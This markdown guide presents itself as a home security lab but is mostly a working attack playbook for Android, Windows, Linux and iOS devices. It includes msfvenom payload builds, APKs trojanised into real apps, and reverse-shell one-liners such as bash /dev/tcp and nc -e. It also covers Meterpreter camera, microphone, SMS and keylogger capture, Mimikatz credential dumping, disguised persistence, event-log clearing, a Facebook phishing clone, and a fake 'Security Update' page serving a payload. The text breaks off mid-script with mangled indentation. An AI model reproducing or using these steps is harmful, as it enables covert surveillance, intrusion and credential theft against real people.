# 💻 Device Hacking — Security Research Lab Guide
### Full Device Control: Android, iOS, Windows, Linux on Your Own Network

> **Lab Setup:** Your laptop (Parrot OS) as attacker, your own phone/devices as targets.
> Everything here is for understanding how attacks work so you can defend against them.

---

## 📚 Table of Contents

1. [Lab Setup and Architecture](#1-lab-setup-and-architecture)
2. [How Device Hacking Works — The Big Picture](#2-how-device-hacking-works)
3. [Metasploit Framework — The Core Tool](#3-metasploit-framework)
4. [Android Hacking — Full Control](#4-android-hacking)
5. [Windows Hacking](#5-windows-hacking)
6. [Linux Hacking](#6-linux-hacking)
7. [iOS Research](#7-ios-research)
8. [Post-Exploitation — What You Can Do After Access](#8-post-exploitation)
9. [Meterpreter — Remote Control Shell](#9-meterpreter)
10. [Persistence — Staying on the Device](#10-persistence)
11. [Privilege Escalation](#11-privilege-escalation)
12. [Social Engineering Attacks](#12-social-engineering-attacks)
13. [Network-Based Exploitation](#13-network-based-exploitation)
14. [Building Your Own Payloads](#14-building-your-own-payloads)
15. [Detecting and Defending Against These Attacks](#15-detecting-and-defending)
16. [Tools Reference](#16-tools-reference)

---

## 1. Lab Setup and Architecture

### Your Lab

```
┌─────────────────────────────────────────────┐
│              YOUR HOME WIFI                  │
│                                              │
│  ┌─────────────────┐    ┌─────────────────┐ │
│  │  Parrot OS      │    │  Target Phone   │ │
│  │  Laptop         │    │  (Android)      │ │
│  │  192.168.1.10   │    │  192.168.1.105  │ │
│  │                 │    │                 │ │
│  │  ATTACKER       │    │  TARGET         │ │
│  └─────────────────┘    └─────────────────┘ │
│                                              │
│  ┌─────────────────┐    ┌─────────────────┐ │
│  │  Target Laptop  │    │  Router         │ │
│  │  Windows/Linux  │    │  192.168.1.1    │ │
│  │  192.168.1.106  │    │                 │ │
│  └─────────────────┘    └─────────────────┘ │
└─────────────────────────────────────────────┘
```

### Find Your Lab IPs

```bash
# On Parrot OS (attacker):
ip addr show
# Note your IP — this is LHOST (attacker IP)

# Find all devices on network
sudo nmap -sn 192.168.1.0/24

# Identify your target devices
# Look for Apple = iPhone, Samsung/Xiaomi/etc = Android
# Check your phone's WiFi settings for its IP
```

### Install Everything on Parrot OS

```bash
# Parrot OS already has most tools
# Update everything first
sudo apt update && sudo apt upgrade -y

# Install/update Metasploit
sudo apt install metasploit-framework -y
msfupdate   # Update modules

# Additional tools
sudo apt install -y \
nmap netdiscover \
apktool adb \
python3-pip git \
mingw-w64 wine \
social-engineer-toolkit

pip3 install pwntools scapy requests

# Verify Metasploit works
msfconsole
# Type: version
# Type: exit
```

---

## 2. How Device Hacking Works — The Big Picture

### The Attack Chain

```
Step 1: RECONNAISSANCE
Learn about target (OS, open ports, services, vulnerabilities)

Step 2: WEAPONIZATION
Create a payload (malicious code that gives you access)

Step 3: DELIVERY
Get the payload onto the target
(Tricks them into running it, exploits a vulnerability, etc.)

Step 4: EXPLOITATION
The payload runs, exploits a weakness, executes your code

Step 5: INSTALLATION
Establish persistent access (so you don't lose access on reboot)

Step 6: COMMAND & CONTROL (C2)
Your laptop talks to the payload on target device
You send commands, receive data

Step 7: POST-EXPLOITATION
Do what you came to do:
- Read files
- Take screenshots
- Turn on camera/mic
- Dump passwords
- Keylog
```

### Types of Payloads

```
Stageless payload:
- Complete payload in one file
- Larger file size
- Works without internet connection back to you
- Better for delivery

Staged payload (stage 1 + stage 2):
- Small initial payload (stage 1) connects back
- Downloads full payload (stage 2) from your machine
- Smaller initial file
- Requires stable connection

Reverse shell:
Target → connects to YOU
✓ Works through firewalls/NAT
✓ You don't need to know target's IP beforehand
✗ Requires your IP to be reachable

Bind shell:
YOU → connect to Target
✓ Simpler
✗ Blocked by firewalls usually
✗ You need target's IP
```

### Connection Types

```
Reverse TCP (most common):
Target connects to Attacker:Port
Works even if target is behind NAT/firewall

Reverse HTTP/HTTPS:
Traffic looks like normal web browsing
Harder to detect/block
Goes through corporate firewalls

Bind TCP:
Opens a listening port on target
You connect to target:port
```

---

## 3. Metasploit Framework

Metasploit is the most powerful exploitation framework. Think of it as a complete toolkit.

### Architecture

```
Metasploit Framework
├── Exploits      → Code that exploits vulnerabilities
├── Payloads      → Code that runs after exploitation
│   ├── Singles   → Self-contained payloads
│   ├── Stagers   → Small connectors
│   └── Stages    → Full payload (Meterpreter)
├── Auxiliaries   → Scanners, fuzzers, sniffers
├── Post          → Post-exploitation modules
├── Encoders      → Obfuscate payloads (bypass AV)
└── NOPs          → Padding for exploits
```

### Starting and Using Metasploit

```bash
# Start Metasploit
msfconsole

# Or start with database (recommended)
sudo systemctl start postgresql
msfdb init    # First time only
msfconsole

# Inside msfconsole:

# Search for modules
search android
search windows smb
search type:exploit platform:android

# Use a module
use exploit/multi/handler

# See module options
show options
info

# Set options
set LHOST 192.168.1.10    # Your IP
set LPORT 4444            # Port to listen on
set PAYLOAD android/meterpreter/reverse_tcp

# Run
run
# or
exploit
```

### Key msfconsole Commands

```bash
# Navigation
help                          # Show help
search [term]                 # Search modules
use [module]                  # Load module
info                          # Module details
show options                  # Required settings
show payloads                 # Compatible payloads
show targets                  # Exploit targets
back                          # Go back

# Setting options
set [OPTION] [value]          # Set option
setg [OPTION] [value]         # Set globally (all modules)
unset [OPTION]                # Clear option
show missing                  # Show unset required options

# Sessions (active connections)
sessions                      # List active sessions
sessions -i 1                 # Interact with session 1
sessions -k 1                 # Kill session 1
sessions -K                   # Kill ALL sessions
background                    # Background current session (Ctrl+Z)

# Running
run / exploit                 # Start exploit
run -j                        # Run in background (job)
jobs                          # List running jobs
kill [job_id]                 # Kill a job

# Workspace
workspace                     # List workspaces
workspace -a lab              # Create workspace
workspace lab                 # Switch to workspace
```

### msfvenom — Payload Generator

msfvenom creates payload files you deliver to targets:

```bash
# Basic syntax:
msfvenom -p [PAYLOAD] LHOST=[YOUR_IP] LPORT=[PORT] -f [FORMAT] -o [OUTPUT_FILE]

# List all payloads
msfvenom --list payloads

# List all formats
msfvenom --list formats

# Common examples:

# Android APK
msfvenom -p android/meterpreter/reverse_tcp \
LHOST=192.168.1.10 LPORT=4444 \
-o evil.apk

# Windows EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp \
LHOST=192.168.1.10 LPORT=4444 \
-f exe -o evil.exe

# Windows DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp \
LHOST=192.168.1.10 LPORT=4444 \
-f dll -o evil.dll

# Linux ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp \
LHOST=192.168.1.10 LPORT=4444 \
-f elf -o evil.elf

# Python script
msfvenom -p python/meterpreter/reverse_tcp \
LHOST=192.168.1.10 LPORT=4444 \
-o evil.py

# Bash script
msfvenom -p cmd/unix/reverse_bash \
LHOST=192.168.1.10 LPORT=4444 \
-o evil.sh

# Encode to bypass antivirus
msfvenom -p windows/x64/meterpreter/reverse_tcp \
LHOST=192.168.1.10 LPORT=4444 \
-e x64/xor_dynamic \    # Encoder
-i 5 \                  # 5 iterations
-f exe -o evil_encoded.exe
```

---

## 4. Android Hacking — Full Control

### Method 1: Malicious APK (Most Common)

#### Step 1: Create the Payload

```bash
# Generate malicious APK
msfvenom -p android/meterpreter/reverse_tcp \
LHOST=192.168.1.10 \
LPORT=4444 \
-o /tmp/payload.apk

# Sign the APK (required for installation)
# Create keystore (one time):
keytool -genkey -v \
-keystore ~/.android/debug.keystore \
-alias androiddebugkey \
-keyalg RSA \
-keysize 2048 \
-validity 10000 \
-storepass android \
-keypass android \
-dname "CN=Android Debug,O=Android,C=US"

# Sign the APK
jarsigner -verbose \
-keystore ~/.android/debug.keystore \
-storepass android \
-keypass android \
/tmp/payload.apk androiddebugkey

# Verify signature
jarsigner -verify /tmp/payload.apk
```

#### Step 2: Set Up Listener

```bash
# In msfconsole:
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
set ExitOnSession false   # Keep listening for more connections
run -j                    # Run as background job
```

#### Step 3: Deliver to Target Phone

```bash
# Method A: ADB (if USB debugging is on)
adb install /tmp/payload.apk

# Method B: Host on web server
cd /tmp
python3 -m http.server 8080
# On target phone, browse to: http://192.168.1.10:8080/payload.apk
# Enable "Install unknown apps" in Settings

# Method C: Share via AirDrop/Bluetooth
# Transfer APK to phone via Bluetooth
# Install it

# Method D: Embed in legitimate APK (advanced)
# See "Bind payload to legitimate app" below
```

#### Bind Payload to a Legitimate App

Make the malicious APK look like a real app (e.g., a game):

```bash
# Download a real APK (e.g., a free game)
# Then inject your payload into it:

msfvenom -p android/meterpreter/reverse_tcp \
LHOST=192.168.1.10 \
LPORT=4444 \
-x /tmp/real_game.apk \   # Original APK to inject into
-o /tmp/game_with_payload.apk

# The result looks and works like the real game
# But also connects back to you!
```

#### Step 4: After Installation — You Have Access!

```
When target opens the app on their phone:
→ App runs
→ Payload executes in background
→ Phone connects to YOUR listener on port 4444
→ Meterpreter session opens on your laptop

In msfconsole you'll see:
[*] Meterpreter session 1 opened (192.168.1.10:4444 → 192.168.1.105:54321)

Type: sessions -i 1
Now you have full control!
```

### Method 2: ADB — Android Debug Bridge

If the phone has USB debugging enabled (common in dev mode):

```bash
# Connect phone via USB or WiFi
adb devices     # List connected devices

# Connect over WiFi (if phone is on same network)
adb connect 192.168.1.105:5555

# Once connected — full shell access!
adb shell

# Inside ADB shell:
whoami          # Usually: shell or u0_a105
id              # User info

# Browse filesystem
ls /sdcard/     # Photos, downloads, documents
ls /data/data/  # App data (requires root)

# Pull files
adb pull /sdcard/DCIM/   ./photos/    # Pull all photos!
adb pull /sdcard/Download/ ./downloads/

# Run commands
adb shell screencap /sdcard/screen.png
adb pull /sdcard/screen.png .        # Screenshot!

adb shell am start -n com.whatsapp/.HomeActivity  # Open WhatsApp

# Install your APK
adb install /tmp/payload.apk

# Root shell (if device is rooted)
adb shell su
# Now you have root access to EVERYTHING
```

### Method 3: Drozer — Android Attack Framework

```bash
# Install drozer
pip3 install drozer

# Install drozer agent on phone:
# Download agent.apk from: https://github.com/WithSecureLabs/drozer
adb install drozer-agent.apk

# Forward port
adb forward tcp:31415 tcp:31415

# Start agent on phone (open drozer app, click "On")

# Connect from laptop
drozer console connect

# Inside drozer:
# List all installed packages
run app.package.list

# Get app details
run app.package.info -a com.example.app

# Find exported activities (can be launched without permission!)
run app.activity.info -a com.example.app

# Launch exported activity directly
run app.activity.start --component com.example.app .AdminActivity

# Find content providers (databases accessible without auth)
run app.provider.info -a com.example.app
run app.provider.query content://com.example.app.provider/users

# Find SQL injection in content providers
run scanner.provider.injection -a com.example.app

# Scan for vulnerabilities automatically
run scanner.misc.writablefiles --privileged /data/data/com.example.app
```

### Android Meterpreter Capabilities

Once you have a Meterpreter session on Android:

```bash
# Inside meterpreter session:

# ===== DEVICE INFO =====
sysinfo                 # Device name, OS version, architecture
getuid                  # Current user
check_root              # Check if device is rooted

# ===== FILES =====
ls                      # List files
cd /sdcard/DCIM/        # Navigate to photos
download photo.jpg      # Download file to your laptop
upload malware.apk /sdcard/  # Upload file

# Pull entire directories
download /sdcard/DCIM/  /tmp/stolen_photos/
download /sdcard/WhatsApp/ /tmp/whatsapp_data/

# ===== CAMERA =====
webcam_list             # List cameras (front + back)
webcam_snap 1           # Take photo with back camera
webcam_snap 2           # Take photo with front camera (selfie!)
webcam_stream           # Live camera stream!

# ===== MICROPHONE =====
record_mic -d 30        # Record 30 seconds of audio

# ===== SCREEN =====
screenshot              # Take screenshot
screengrab              # Another screenshot method

# ===== LOCATION =====
geolocate               # Get GPS coordinates!
# Returns latitude and longitude

# ===== CONTACTS & SMS =====
dump_contacts           # All contacts with phone numbers
dump_sms                # All SMS messages (sent and received!)
dump_calllog            # Call history

# ===== NETWORK =====
ipconfig                # Network interfaces
route                   # Routing table
portfwd add -l 8080 -p 80 -r 192.168.1.1  # Port forwarding

# ===== SHELL =====
shell                   # Drop to Android shell
# Now you can run any Linux command!

# ===== APPS =====
app_list                # List all installed apps
# Look for: banking apps, password managers, etc.

# ===== PERSISTENCE =====
run app.get_running_services   # List running services
```

---

## 5. Windows Hacking

### Method 1: EXE Payload

```bash
# Create Windows payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
LHOST=192.168.1.10 \
LPORT=4444 \
-f exe \
-o /tmp/update.exe

# Set up listener
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
run -j
```

### Method 2: HTA File (HTML Application)

HTA files run on Windows natively — no suspicious EXE needed:

```bash
# Generate HTA payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
LHOST=192.168.1.10 \
LPORT=4444 \
-f hta-psh \
-o /tmp/update.hta

# Host it
cd /tmp && python3 -m http.server 80

# When target opens: http://192.168.1.10/update.hta
# Windows asks: "Do you want to run this application?"
# Click "Run" → you get a shell!
```

### Method 3: PowerShell Payload

```bash
# PowerShell one-liner payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
LHOST=192.168.1.10 \
LPORT=4444 \
-f psh-cmd \
-o /tmp/payload.txt

# The output is a PowerShell command
# Have target run it in PowerShell:
# Copy paste the command into a PowerShell window

# Or embed in a bat file:
msfvenom -p cmd/windows/reverse_powershell \
LHOST=192.168.1.10 \
LPORT=4444 \
-f raw > payload.bat
```

### Method 4: Office Macro (Word/Excel)

```bash
# Create a macro payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
LHOST=192.168.1.10 \
LPORT=4444 \
-f vba \
-o /tmp/macro.txt

# Then:
# 1. Open Word/Excel on your machine
# 2. Go to: Developer → Visual Basic
# 3. Paste the macro code into ThisDocument or a Module
# 4. Save as .docm or .xlsm (macro-enabled)
# 5. When target opens file and enables macros → shell!
```

### Method 5: EternalBlue (SMB Exploit)

EternalBlue exploits unpatched Windows SMB vulnerability (MS17-010):

```bash
# First check if target is vulnerable
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.106
run

# If vulnerable:
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.106
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
run

# IMPORTANT: Only works on unpatched Windows 7/8/Server 2008
# Patched in MS17-010 security update (2017)
# Good to know about but most modern Windows is patched
```

### Windows Meterpreter Capabilities

```bash
# ===== SYSTEM INFO =====
sysinfo                     # OS, hostname, architecture
getuid                      # Current user
getpid                      # Current process ID
ps                          # List all processes

# ===== PRIVILEGE ESCALATION =====
getsystem                   # Try to get SYSTEM privileges
getprivs                    # List current privileges

# ===== FILES =====
ls C:\\Users\\               # List users
download C:\\Users\\target\\Documents\\  # Download documents
download C:\\Users\\target\\Desktop\\    # Download desktop files

# ===== PASSWORDS =====
hashdump                    # Dump password hashes from SAM
# Example output:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# target:1000:aad3b435:...

# Crack hashes with hashcat:
# hashcat -m 1000 hashes.txt wordlist.txt

# Dump credentials from memory (Mimikatz)
load kiwi                   # Load Mimikatz module
creds_all                   # Dump ALL credentials
lsa_dump_sam                # Dump SAM database
wifi_list                   # List saved WiFi passwords!

# ===== SCREEN & INPUT =====
screenshot                  # Screenshot
screenshare                 # Live screen stream!
keyscan_start               # Start keylogger
keyscan_dump                # Show captured keystrokes
keyscan_stop                # Stop keylogger

# ===== WEBCAM =====
webcam_list                 # List webcams
webcam_snap                 # Take photo
webcam_stream               # Live camera!

# ===== NETWORK =====
arp                         # ARP table
route                       # Routing table
netstat                     # Active connections
portfwd add -l 3306 -p 3306 -r 10.0.0.1  # Pivot

# ===== SHELL =====
shell                       # Windows CMD shell
execute -f cmd.exe -i       # Interactive shell

# ===== PERSISTENCE =====
run persistence -X -i 30 -p 4444 -r 192.168.1.10
# -X = start on boot
# -i 30 = reconnect every 30 seconds
# Installs itself as a Windows service!

# ===== CLEAR TRACKS =====
clearev                     # Clear Windows event logs
timestomp file.txt -b       # Modify file timestamps
```

---

## 6. Linux Hacking

### Method 1: ELF Binary

```bash
# Create Linux payload
msfvenom -p linux/x64/meterpreter/reverse_tcp \
LHOST=192.168.1.10 \
LPORT=4444 \
-f elf \
-o /tmp/update

chmod +x /tmp/update

# Set up listener
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
run
```

### Method 2: Bash One-Liner Reverse Shell

The simplest possible reverse shell — no binary needed:

```bash
# On your laptop: start listener
nc -lvnp 4444

# Have target run this one-liner (any Linux shell):
bash -i >& /dev/tcp/192.168.1.10/4444 0>&1

# Python reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.1.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Netcat reverse shell
nc 192.168.1.10 4444 -e /bin/bash
```

### Method 3: Exploit SSH (Brute Force)

```bash
# Scan for SSH on network
nmap -p 22 192.168.1.0/24

# Brute force SSH
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.106
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 10
run

# If successful:
# [+] 192.168.1.106:22 - Success: 'root:password123'
# sessions -i 1   → shell access!
```

---

## 7. iOS Research

iOS is much harder than Android due to sandboxing and code signing.

### What's Possible

```
Without jailbreak:
✓ Traffic interception (with certificate installed)
✓ App analysis (static, with IPA)
✓ Frida (limited on non-jailbroken)
✗ Shell access
✗ File system access outside app sandbox
✗ Meterpreter

With jailbreak:
✓ Full shell access via SSH
✓ File system access
✓ Frida with full capabilities
✓ Dump app data
✓ Keychain access
✗ Apple silicon devices (A12+) — harder to jailbreak
```

### SSH into Jailbroken iOS

```bash
# Connect via USB (with usbmuxd)
sudo apt install usbmuxd libimobiledevice-utils
iproxy 2222 22 &
ssh root@localhost -p 2222
# Default password: alpine (CHANGE THIS!)

# Over WiFi
ssh root@192.168.1.105
# Password: alpine

# Once in:
ls /var/mobile/Containers/Data/Application/
# Lists all app data directories

# Find specific app
find /var/mobile/Containers/ -name "*.sqlite" 2>/dev/null
# Find databases

# Access keychain
# Use keychain-dumper tool:
/usr/bin/keychain-dumper > /tmp/keychain.txt
cat /tmp/keychain.txt
# Shows passwords, tokens stored in keychain
```

---

## 8. Post-Exploitation

Post-exploitation is everything you do AFTER gaining access.

### Information Gathering

```bash
# On any Meterpreter session:

# ===== AUTOMATIC RECON =====
run post/multi/recon/local_exploit_suggester
# Suggests privilege escalation exploits for this system

run post/multi/gather/env
# Environment variables

# Android specific
run post/android/gather/sub_info        # SIM card info
run post/android/gather/hashdump        # Password hashes
run post/android/gather/accounts        # Google/email accounts
run post/android/gather/check_root      # Root status

# Windows specific
run post/windows/gather/enum_system     # Full system enum
run post/windows/gather/credentials/credential_collector
run post/windows/gather/smart_hashdump  # Credential dump
run post/windows/gather/enum_browsers   # Browser saved passwords!

# Linux specific
run post/linux/gather/enum_system
run post/linux/gather/hashdump
run post/linux/gather/enum_network
```

### File Hunting

```bash
# Search for interesting files
search -f *.pdf                 # All PDFs
search -f *.docx                # Word documents
search -f password*             # Files with "password" in name
search -f *.kdbx                # KeePass databases!
search -f id_rsa                # SSH private keys!
search -f *.pem                 # SSL certificates/keys
search -f wallet.dat            # Bitcoin wallets!

# Download everything interesting
download -r /home/user/Documents/  /tmp/loot/docs/
download -r /home/user/Desktop/    /tmp/loot/desktop/

# On Android:
download /sdcard/DCIM/          /tmp/loot/photos/
download /sdcard/WhatsApp/Media/ /tmp/loot/whatsapp/
download /sdcard/Documents/      /tmp/loot/documents/
```

### Browser Data Extraction

```bash
# Windows - Chrome saved passwords
run post/windows/gather/credentials/chrome

# Linux - Firefox/Chrome
shell
cat ~/.mozilla/firefox/*.default/logins.json
# or
python3 /usr/share/metasploit-framework/data/exploits/chrome_decrypt.py

# Manual on Linux
find / -name "Login Data" 2>/dev/null   # Chrome login DB
find / -name "logins.json" 2>/dev/null  # Firefox logins
find / -name "cookies.sqlite" 2>/dev/null  # Firefox cookies

# Copy Chrome SQLite DB and read it
sqlite3 "Login Data" "SELECT origin_url, username_value, password_value FROM logins"
# Note: Passwords are encrypted with OS keychain
```

---

## 9. Meterpreter — Remote Control Shell

Meterpreter is the most powerful payload. It runs in memory, is encrypted, and has hundreds of capabilities.

### Full Command Reference

```bash
# ===== CORE =====
help                    # Show all commands
background (Ctrl+Z)     # Background session
exit                    # Close session
info                    # Session info

# ===== FILE SYSTEM =====
pwd                     # Current directory
ls                      # List files
cd /path                # Change directory
cat file.txt            # Read file
download file.txt       # Download to attacker
upload local.txt /tmp/  # Upload to target
rm file.txt             # Delete file
mkdir /tmp/new          # Create directory
search -f *.pdf -d /    # Search for files

# ===== PROCESS =====
ps                      # List all processes
kill [PID]              # Kill process
getpid                  # Current process ID
migrate [PID]           # Migrate to another process
# (Useful: migrate to explorer.exe = stable)
execute -f calc.exe     # Run program

# ===== SYSTEM =====
sysinfo                 # System information
getuid                  # Current user
getprivs                # User privileges
getsystem               # Escalate to SYSTEM/root
reboot                  # Reboot target!
shutdown                # Shutdown target!
env                     # Environment variables

# ===== NETWORK =====
ipconfig                # Network interfaces
arp                     # ARP table
route                   # Route table
netstat                 # Active connections
portfwd add -l 3306 -p 3306 -r 10.0.0.5
# Tunnel port through session

# ===== AUDIO/VIDEO =====
webcam_list             # List cameras
webcam_snap             # Take photo
webcam_stream           # Live stream
record_mic              # Record microphone
screenshot              # Take screenshot
screenshare             # Live screen

# ===== INTERACTION =====
shell                   # Command shell
keyboard_send "hello"   # Type keys
mouse_move 100 200      # Move mouse
mouse_click             # Click mouse

# ===== KEYLOGGER =====
keyscan_start           # Start keylogger
keyscan_dump            # Show logged keystrokes
keyscan_stop            # Stop keylogger

# ===== HASH / PASSWORDS =====
hashdump                # Dump password hashes
load kiwi               # Load Mimikatz
creds_all               # Dump all creds
wifi_list               # Saved WiFi passwords
```

### Migrating to Stable Process

When your payload process is killed, you lose access. Migrate to a stable system process:

```bash
# List processes
ps

# Find a stable process:
# Windows: explorer.exe, svchost.exe, winlogon.exe
# Linux: init, systemd, bash

# Migrate
migrate 1234    # PID of target process

# Now even if original payload is killed, you stay in memory!
```

---

## 10. Persistence

Persistence means maintaining access even after reboot or if the payload is killed.

### Android Persistence

```bash
# Method 1: Meterpreter persistence module
run exploit/android/local/janus_exploit_dropper

# Method 2: Via ADB (if rooted)
adb shell
su
# Copy payload to auto-start location
cp /sdcard/payload.apk /system/app/SystemUpdate.apk
# Or add to init.d:
echo "am start -n com.payload/.MainActivity" >> /system/etc/init.d/99payload

# Method 3: Create a persistent service
run post/android/manage/install_apk

# Meterpreter auto-reconnect
# Edit your payload to reconnect every 30 seconds:
msfvenom -p android/meterpreter/reverse_tcp \
LHOST=192.168.1.10 LPORT=4444 \
-o payload.apk
# The meterpreter payload already handles reconnection!
```

### Windows Persistence

```bash
# Method 1: Registry autorun
run post/windows/manage/persistence_exe \
STARTUP=REGISTRY \
EXE_NAME=svchost32.exe

# Method 2: Scheduled task
shell
schtasks /create /tn "SystemUpdate" \
/tr "C:\Users\Public\update.exe" \
/sc onlogon /ru SYSTEM

# Method 3: Service
sc create SystemUpdate \
binpath= "C:\Users\Public\update.exe" \
start= auto

# Method 4: Startup folder
copy update.exe "C:\Users\target\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"

# Method 5: WMI subscription (stealthy, fileless)
run post/windows/manage/persistence \
STARTUP=SCHEDULER \
EXE_NAME=system32update
```

### Linux Persistence

```bash
# Method 1: Crontab
crontab -e
# Add: @reboot /tmp/.hidden_payload &
# Or:  */5 * * * * /tmp/.hidden_payload &   (every 5 min)

# Method 2: .bashrc / .profile
echo "/tmp/.payload &" >> ~/.bashrc
echo "/tmp/.payload &" >> ~/.profile

# Method 3: Systemd service
cat > /etc/systemd/system/system-update.service << EOF
[Unit]
Description=System Update Service

[Service]
ExecStart=/tmp/.payload
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable system-update
systemctl start system-update

# Method 4: Init.d (older systems)
cp /tmp/.payload /etc/init.d/system-update
update-rc.d system-update defaults
```

---

## 11. Privilege Escalation

Start as low-privilege user → get root/SYSTEM.

### Automatic Privilege Escalation

```bash
# Try all methods automatically
getsystem

# If that fails, find exploits for current system
run post/multi/recon/local_exploit_suggester

# Example output:
# [+] exploit/windows/local/bypassuac_eventvwr - Appears to be a valid target
# [+] exploit/windows/local/tokenmagic - Appears to be a valid target
# use exploit/windows/local/bypassuac_eventvwr
# set SESSION 1
# run
```

### Manual Linux Privilege Escalation

```bash
# Check who you are
id
whoami

# What can you run as sudo without password?
sudo -l

# Find SUID binaries (run as root regardless of who runs them)
find / -perm -4000 -type f 2>/dev/null

# Look for exploitable SUIDs on GTFOBins:
# https://gtfobins.github.io/

# Example: If vim has SUID:
vim -c ':!/bin/bash'   # Drops to root shell!

# Check for writable paths in PATH
echo $PATH
ls -la /usr/local/bin/   # Can you write here?

# Kernel exploits
uname -a                 # Kernel version
searchsploit linux kernel 5.4   # Find exploits

# Check for passwords in config files
grep -r "password" /etc/ 2>/dev/null
cat /etc/mysql/debian.cnf   # MySQL password sometimes here

# Check for SSH keys
ls ~/.ssh/
cat ~/.ssh/id_rsa   # Private key = access to other systems!
```

### Windows Privilege Escalation

```bash
# In meterpreter:
run post/multi/recon/local_exploit_suggester

# Or manually:
shell

# Check privileges
whoami /priv
whoami /groups

# AlwaysInstallElevated (MSI installs as SYSTEM)
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both = 1 → create malicious MSI:
msfvenom -p windows/x64/meterpreter/reverse_tcp \
LHOST=192.168.1.10 LPORT=5555 \
-f msi -o evil.msi
msiexec /quiet /i evil.msi   # Runs as SYSTEM!

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | \
findstr /i "auto" | findstr /i /v "c:\windows\\" | \
findstr /i /v """

# Token impersonation (if SeImpersonatePrivilege)
use exploit/windows/local/ms16_075_reflection_juicy
```

---

## 12. Social Engineering Attacks

Get target to run your payload willingly.

### SET (Social Engineering Toolkit)

```bash
# Start SET
sudo setoolkit

# Menu options:
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester
# 4) QRCode Generator

# Most useful: Credential Harvester
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack Method
# 2) Site Cloner
# Enter URL to clone: https://facebook.com
# SET clones Facebook login page!
# When target enters credentials → you capture them!

# Your machine serves the fake page at http://192.168.1.10/
```

### Fake Update Page

```python
# fake_update.py — Serve a fake update page
from http.server import HTTPServer, BaseHTTPRequestHandler
import os

HTML = """
<!DOCTYPE html>
<html>
<head>
<title>System Update Required</title>
<style>
body { font-family: Arial; text-align: center; margin-top: 100px; }
button { background: #0078d4; color: white; padding: 10px 20px;
font-size: 16px; border: none; cursor: pointer; }
</style>
</head>
<body>
<h1>⚠ Security Update Required</h1>
<p>A critical security update is available for your device.</p>
<p>Please download and install the update to continue.</p>
<a href="/payload.apk">
<button>Download Update (Android)</button>
</a>
</body>
</html>
"""

class FakeUpdateHandler(BaseHTTPRequestHandler):
def do_GET(self):
if self.path == '/':
	self.send_response(200)
	self.send_header('Content-Type', 'text/html')
	self.end_headers()
	self.wfile.write(HTML.encode())
	
	elif self.path == '/payload.apk':
	with open('/tmp/payload.apk', 'rb') as f:
	data = f.read()
	self.send_response(200)
	self.send_header('Content-Type', 'application/vnd.android.package-archive')
	self.send_header('Content-Disposition', 'attachment; filename="SecurityUpdate.apk"')
	self.end_headers()
	self.wfile.write(data)
	
	print(f"[+] Request from {self.client_address[0]}: {self.path}")
	
	def log_message(self, format, *args):
	pass  # Suppress default logging
	
	server = HTTPServer(('0.0.0.0', 80), FakeUpdateHandler)
	print("[*] Fake update server running on port 80")
	print("[*] Point target to: http://192.168.1.10/")
	server.serve_forever()
	```
	
	### QR Code Attack
	
	```bash
	# Create a QR code that points to your payload page
	# Install qrencode
	sudo apt install qrencode
	
	qrencode -o qr_attack.png "http://192.168.1.10/payload.apk"
	# Or point to your credential harvester:
	qrencode -o qr_attack.png "http://192.168.1.10/"
	
	# Display/print the QR code
	# When target scans it → goes to your server
	```
	
	---
	
	## 13. Network-Based Exploitation
	
	Exploit services running on devices.
	
	### SMB (Windows File Sharing)
	
	```bash
	# Scan for SMB
	nmap -p 445 --script smb-vuln* 192.168.1.0/24
	
	# EternalBlue (MS17-010) - patched but educational
	use exploit/windows/smb/ms17_010_eternalblue
	set RHOSTS 192.168.1.106
	run
	
	# Anonymous SMB access
	smbclient -L //192.168.1.106 -N   # List shares without password
	smbclient //192.168.1.106/share -N  # Connect to share
	
	# Mount SMB share
	sudo mount -t cifs //192.168.1.106/C$ /mnt/ \
	-o username=user,password=pass
	```
	
	### Exploiting Routers
	
	```bash
	# Scan router for vulnerabilities
	nmap -sV -p 80,443,22,23,8080 192.168.1.1
	
	# Check for default credentials
	use auxiliary/scanner/http/router_default_creds
	set RHOSTS 192.168.1.1
	run
	
	# RouterSploit framework
	sudo apt install routersploit
	rsf
	use scanners/routers/router_scan
	set TARGET 192.168.1.1
	run
	```
	
	### MITM + Payload Injection
	
	Inject your payload into HTTP downloads:
	
	```bash
	# With bettercap:
	sudo bettercap -iface eth0
	
	# In bettercap:
	set arp.spoof.targets 192.168.1.105
	arp.spoof on
	
	# Inject payload into HTTP file downloads
	set http.proxy.script inject_payload.js
	http.proxy on
	```
	
	```javascript
	// inject_payload.js — Bettercap script to inject payloads
	function onResponse(req, res) {
		// If target is downloading an EXE, replace with our payload!
